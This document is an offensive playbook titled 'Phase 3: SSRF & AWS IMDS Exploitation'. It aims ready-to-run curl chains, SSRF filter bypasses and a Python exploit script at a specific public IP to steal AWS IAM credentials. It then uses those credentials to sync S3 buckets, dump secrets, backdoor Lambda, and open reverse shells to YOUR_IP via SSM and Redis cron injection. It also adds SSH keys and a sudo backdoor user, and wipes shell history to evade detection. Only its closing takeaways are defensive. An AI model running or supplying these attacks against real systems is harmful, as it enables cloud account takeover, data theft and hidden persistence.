# Phase 3: SSRF & AWS IMDS Exploitation

## Overview
Server-Side Request Forgery (SSRF) allows attackers to make requests from the server to internal resources. When combined with AWS Instance Metadata Service (IMDS), this can lead to credential theft and complete cloud infrastructure compromise.

## Tools Required
- curl
- Burp Suite
- SSRFmap
- aws-cli
- Custom Python scripts

---

## 1. Basic SSRF Testing

### 1.1 Identify SSRF Parameters
```bash
# Look for URL parameters that fetch external resources
# Common parameters: url, uri, path, redirect, next, callback, feed

# Test basic SSRF
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://example.com"

# Test localhost access
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://localhost"
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://127.0.0.1"

# Test internal network access
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://192.168.1.1"
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://10.0.0.1"
```

### 1.2 SSRF Bypass Techniques
```bash
# IP encoding bypass
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://2130706433"  # 127.0.0.1 in decimal
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://0x7f000001"  # 127.0.0.1 in hex
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://0177.0.0.1"  # Octal encoding

# DNS rebinding
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://localtest.me"  # Points to 127.0.0.1
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://127.0.0.1.nip.io"

# URL encoding bypass
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://%31%32%37%2e%30%2e%30%2e%31"

# @ character bypass
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://trusted.com@127.0.0.1"

# Double encoding
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://%2531%2532%2537%252e%2530%252e%2530%252e%2531"
```

---

## 2. AWS IMDS Exploitation

### 2.1 Understanding IMDS Versions

**IMDS v1 (Vulnerable)**:
- No authentication required
- Simple HTTP GET requests
- Endpoint: http://169.254.169.254/latest/meta-data/

**IMDS v2 (Secure)**:
- Requires session token
- Two-step process: get token, then use token
- Endpoint: http://169.254.169.254/latest/api/token

### 2.2 Exploit IMDS v1 (Our Target)
```bash
# Step 1: Test IMDS access via SSRF
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254"

# Step 2: List available metadata
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"

# Step 3: Get instance information
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/instance-id"
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/instance-type"
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/local-ipv4"
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/public-ipv4"

# Step 4: List IAM roles
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Step 5: Extract IAM credentials (CRITICAL)
ROLE_NAME=$(curl -s "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" | jq -r '.metadata')
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME"
```

### 2.3 Parse and Use Stolen Credentials
```bash
# Extract credentials from IMDS response
curl -s "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Admin-Role" > creds.json

# Parse credentials
export AWS_ACCESS_KEY_ID=$(cat creds.json | jq -r '.metadata' | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(cat creds.json | jq -r '.metadata' | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(cat creds.json | jq -r '.metadata' | jq -r '.Token')

# Verify credentials
aws sts get-caller-identity

# Expected output:
# {
#     "UserId": "AIDAXXXXXXXXXXXXXXXXX",
#     "Account": "123456789012",
#     "Arn": "arn:aws:sts::123456789012:assumed-role/EC2-Admin-Role/i-0123456789abcdef0"
# }
```

### 2.4 Get Additional Metadata
```bash
# User data (may contain secrets)
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/user-data"

# Network interfaces
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/network/interfaces/macs/"

# Security groups
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/security-groups"

# Block device mapping
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/block-device-mapping/"
```

---

## 3. AWS CLI Exploitation

### 3.1 Enumerate IAM Permissions
```bash
# Check current identity
aws sts get-caller-identity

# List IAM users (if permitted)
aws iam list-users

# List IAM roles
aws iam list-roles

# Get attached policies
aws iam list-attached-role-policies --role-name EC2-Admin-Role

# Get inline policies
aws iam list-role-policies --role-name EC2-Admin-Role
```

### 3.2 EC2 Enumeration
```bash
# List all EC2 instances
aws ec2 describe-instances

# List security groups
aws ec2 describe-security-groups

# List snapshots
aws ec2 describe-snapshots --owner-ids self

# List volumes
aws ec2 describe-volumes

# List key pairs
aws ec2 describe-key-pairs
```

### 3.3 S3 Bucket Enumeration
```bash
# List all S3 buckets
aws s3 ls

# List bucket contents
aws s3 ls s3://company-secrets/

# Download sensitive files
aws s3 cp s3://company-secrets/credentials.txt ./

# Sync entire bucket
aws s3 sync s3://company-backups/ ./backups/
```

### 3.4 Systems Manager (SSM) for RCE
```bash
# List SSM managed instances
aws ssm describe-instance-information

# Execute commands on EC2 instance (PRIVILEGE ESCALATION)
aws ssm send-command \
    --instance-ids "i-0123456789abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["whoami","id","uname -a"]'

# Get command execution results
COMMAND_ID="abc123-def456-ghi789"
aws ssm get-command-invocation \
    --command-id "$COMMAND_ID" \
    --instance-id "i-0123456789abcdef0"

# Create reverse shell via SSM
aws ssm send-command \
    --instance-ids "i-0123456789abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"]'

# Add SSH key for persistence
aws ssm send-command \
    --instance-ids "i-0123456789abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["echo \"ssh-rsa AAAA...\" >> /home/ec2-user/.ssh/authorized_keys"]'

# Create root backdoor
aws ssm send-command \
    --instance-ids "i-0123456789abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["sudo useradd -m -s /bin/bash backdoor","sudo echo \"backdoor:password123\" | sudo chpasswd","sudo usermod -aG sudo backdoor"]'
```

### 3.5 Secrets Manager Exploitation
```bash
# List secrets
aws secretsmanager list-secrets

# Get secret value
aws secretsmanager get-secret-value --secret-id production-db-password

# Decrypt secret
aws secretsmanager get-secret-value --secret-id api-keys | jq -r '.SecretString'
```

### 3.6 Lambda Function Exploitation
```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name sensitive-data-processor

# Invoke function
aws lambda invoke --function-name admin-function output.json

# Update function code (backdoor)
zip function.zip malicious_handler.py
aws lambda update-function-code --function-name target-function --zip-file fileb://function.zip
```

---

## 4. Advanced SSRF Techniques

### 4.1 SSRFmap Automation
```bash
# Install SSRFmap
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap
pip3 install -r requirements.txt

# Run automated SSRF exploitation
python3 ssrfmap.py -r request.txt -p url -m readfiles

# AWS-specific module
python3 ssrfmap.py -r request.txt -p url -m aws
```

### 4.2 Blind SSRF Detection
```bash
# Use Burp Collaborator or requestbin.com
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://YOUR_BURP_COLLABORATOR.com"

# DNS-based exfiltration
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://$(whoami).attacker.com"

# Timing-based detection
time curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254:81"
```

### 4.3 SSRF to RCE via Redis
```bash
# If Redis is accessible via SSRF
# Create malicious Redis commands
cat <<EOF > redis_exploit.txt
FLUSHALL
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
EOF

# URL encode and send via SSRF
PAYLOAD=$(cat redis_exploit.txt | python3 -c "import sys; from urllib.parse import quote; print(quote(sys.stdin.read()))")
curl "http://3.35.218.180/api/health.php?check=metadata&url=http://127.0.0.1:6379/$PAYLOAD"
```

---

## 5. Automation Script

### 5.1 Complete SSRF to IMDS Exploitation
```python
#!/usr/bin/env python3
# ssrf_imds_exploit.py

import requests
import json
import sys
import subprocess

TARGET = "http://3.35.218.180"
SSRF_ENDPOINT = "/api/health.php"

def test_ssrf(url):
    """Test SSRF vulnerability"""
    params = {
        'check': 'metadata',
        'url': url
    }
    try:
        r = requests.get(f"{TARGET}{SSRF_ENDPOINT}", params=params, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return data.get('metadata', '')
    except:
        pass
    return None

def exploit_imds():
    """Exploit AWS IMDS via SSRF"""
    print("[*] Testing IMDS access...")

    # Test IMDS connectivity
    result = test_ssrf("http://169.254.169.254/latest/meta-data/")
    if not result:
        print("[-] IMDS not accessible")
        return False

    print("[+] IMDS accessible!")

    # Get instance information
    print("\n[*] Gathering instance information...")
    instance_id = test_ssrf("http://169.254.169.254/latest/meta-data/instance-id")
    instance_type = test_ssrf("http://169.254.169.254/latest/meta-data/instance-type")
    local_ip = test_ssrf("http://169.254.169.254/latest/meta-data/local-ipv4")
    public_ip = test_ssrf("http://169.254.169.254/latest/meta-data/public-ipv4")

    print(f"[+] Instance ID: {instance_id}")
    print(f"[+] Instance Type: {instance_type}")
    print(f"[+] Local IP: {local_ip}")
    print(f"[+] Public IP: {public_ip}")

    # Get IAM role
    print("\n[*] Extracting IAM credentials...")
    role_name = test_ssrf("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
    if not role_name:
        print("[-] No IAM role attached")
        return False

    print(f"[+] IAM Role: {role_name}")

    # Get credentials
    creds_json = test_ssrf(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
    try:
        creds = json.loads(creds_json)
        access_key = creds['AccessKeyId']
        secret_key = creds['SecretAccessKey']
        token = creds['Token']

        print(f"\n[+] AWS Credentials Stolen:")
        print(f"    AccessKeyId: {access_key}")
        print(f"    SecretAccessKey: {secret_key[:20]}...")
        print(f"    SessionToken: {token[:40]}...")

        # Save credentials
        with open('aws_credentials.txt', 'w') as f:
            f.write(f"export AWS_ACCESS_KEY_ID={access_key}\n")
            f.write(f"export AWS_SECRET_ACCESS_KEY={secret_key}\n")
            f.write(f"export AWS_SESSION_TOKEN={token}\n")

        print(f"\n[+] Credentials saved to aws_credentials.txt")
        print(f"[+] Run: source aws_credentials.txt")

        return True

    except Exception as e:
        print(f"[-] Failed to parse credentials: {e}")
        return False

def enumerate_aws(access_key, secret_key, token):
    """Enumerate AWS resources using stolen credentials"""
    import os
    os.environ['AWS_ACCESS_KEY_ID'] = access_key
    os.environ['AWS_SECRET_ACCESS_KEY'] = secret_key
    os.environ['AWS_SESSION_TOKEN'] = token

    print("\n[*] Enumerating AWS resources...")

    # Get caller identity
    result = subprocess.run(['aws', 'sts', 'get-caller-identity'], capture_output=True, text=True)
    print(f"\n[+] Identity:\n{result.stdout}")

    # List EC2 instances
    result = subprocess.run(['aws', 'ec2', 'describe-instances'], capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] EC2 enumeration successful")

    # List S3 buckets
    result = subprocess.run(['aws', 's3', 'ls'], capture_output=True, text=True)
    if result.returncode == 0:
        print(f"[+] S3 Buckets:\n{result.stdout}")

    # List SSM managed instances
    result = subprocess.run(['aws', 'ssm', 'describe-instance-information'], capture_output=True, text=True)
    if result.returncode == 0:
        print("[+] SSM access confirmed - can execute commands on instances!")

if __name__ == "__main__":
    print("="*60)
    print("SSRF to AWS IMDS Exploitation Tool")
    print("="*60)

    if exploit_imds():
        print("\n[+] Exploitation successful!")
        print("[*] Next steps:")
        print("    1. source aws_credentials.txt")
        print("    2. aws sts get-caller-identity")
        print("    3. aws ssm send-command --instance-ids <ID> --document-name AWS-RunShellScript --parameters 'commands=[\"whoami\"]'")
    else:
        print("\n[-] Exploitation failed")
```

### 5.2 Usage
```bash
# Make executable
chmod +x ssrf_imds_exploit.py

# Run exploitation
python3 ssrf_imds_exploit.py

# Load stolen credentials
source aws_credentials.txt

# Verify access
aws sts get-caller-identity

# Execute commands via SSM
aws ssm send-command \
    --instance-ids "i-0123456789abcdef0" \
    --document-name "AWS-RunShellScript" \
    --parameters 'commands=["id","cat /etc/shadow"]'
```

---

## 6. Defense Evasion

### 6.1 Avoid Detection
```bash
# Use legitimate AWS user-agent
curl -H "User-Agent: aws-cli/2.13.0 Python/3.11.0" \
    "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/"

# Spread requests over time
for endpoint in instance-id instance-type local-ipv4; do
    curl "http://3.35.218.180/api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/$endpoint"
    sleep $((RANDOM % 60 + 30))  # Random delay 30-90 seconds
done
```

### 6.2 Clean Up Traces
```bash
# Remove local credential files
shred -vfz -n 10 aws_credentials.txt
shred -vfz -n 10 creds.json

# Clear AWS CLI history
rm -f ~/.aws/cli/cache/*
rm -f ~/.bash_history
history -c
```

---

## Key Takeaways

1. SSRF allows access to internal services not exposed to internet
2. AWS IMDS v1 requires no authentication - major security risk
3. Stolen IAM credentials provide access to entire AWS account
4. SSM can be used for remote command execution = instant root access
5. Always check for IMDS v2 enforcement in production environments
6. Monitor CloudTrail logs for unusual API calls from EC2 instances

## Next Steps
Proceed to Phase 4: Reverse Shell techniques for interactive access.
